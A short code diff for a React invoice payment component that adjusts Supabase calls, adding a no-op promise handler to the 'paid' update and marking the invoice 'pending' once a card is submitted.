@@ -78,7 +78,7 @@ const InvoicePayment = () => {
       if (newStatus === "card_invalid") { setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again."); setStep("card_declined"); }
     }
     if (currentStep === "processing") {
-      if (newStatus === "success") { setStep("success"); supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId); }
+      if (newStatus === "success") { setStep("success"); supabase.from("invoices").update({ status: "paid" }).eq("id", invoiceId).then(() => {}); }
       if (newStatus === "rejected") setStep("rejected");
       if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
       if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
@@ -108,6 +108,10 @@ const InvoicePayment = () => {
       else setSubmittedCardBrand("card");
     }
     setStep("processing_card");
+    // Mark invoice as pending
+    if (invoiceId) {
+      await supabase.from("invoices").update({ status: "pending" as any }).eq("id", invoiceId);
+    }
   };
 
   const handleProcessingComplete = useCallback(() => {
